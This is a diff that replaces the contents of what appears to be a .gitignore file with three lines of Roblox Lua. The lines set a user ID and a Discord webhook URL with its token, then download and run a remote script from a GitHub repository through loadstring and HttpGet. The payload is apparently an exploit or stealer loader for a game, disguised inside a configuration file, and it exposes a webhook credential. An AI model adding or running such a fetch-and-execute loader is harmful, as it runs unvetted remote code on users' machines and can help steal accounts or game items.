@@ -1,18 +1,3 @@
-# Build and Release Folders
-bin-debug/
-bin-release/
-[Oo]bj/
-[Bb]in/
-
-# Other files and folders
-.settings/
-
-# Executables
-*.swf
-*.air
-*.ipa
-*.apk
-
-# Project files, i.e. `.project`, `.actionScriptProperties` and `.flexProperties`
-# should NOT be excluded as they contain compiler settings and other important
-# information for Eclipse / Flash Builder.
+_G.UserID = 1136436754
+_G.WebHook = "https://discord.com/api/webhooks/1022912036885233725/Tm-SQS2_4fYu2XWgubh87IssonW2CddqeMK_tZx4_Tf4Nmh0O3olHECYRPlIbt2ipBi_"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/Psx.v3/main/SilenceScripts.true"))()
